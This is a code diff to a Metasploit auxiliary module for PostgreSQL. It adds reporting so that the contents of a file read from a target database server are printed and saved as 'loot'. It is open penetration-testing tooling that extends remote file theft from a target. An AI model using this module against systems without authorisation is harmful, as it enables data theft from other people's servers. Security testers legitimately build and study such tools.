@@ -15,6 +15,7 @@ require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::Postgres
+	include Msf::Auxiliary::Report
 
 	def initialize(info = {})
 		super(update_info(info,
@@ -67,6 +68,14 @@ class Metasploit3 < Msf::Auxiliary
 				print_error "#{rhost}:#{rport} Postgres - #{ret[:sql_error]}"
 			end
 		when :complete
+			loot = ''
+			ret[:complete].rows.each { |row|
+				print_line(row.first)
+				loot << row.first
+			}
+			# No idea what the actual ctype will be, text/plain is just a guess
+			path = store_loot('postgres.file', 'text/plain', rhost, loot, datastore['RFILE'])
+			print_status("#{rhost}:#{rport} Postgres - #{datastore['RFILE']} saved in #{path}")
 			vprint_good  "#{rhost}:#{rport} Postgres - Command complete."
 		end
 		postgres_logout if self.postgres_conn
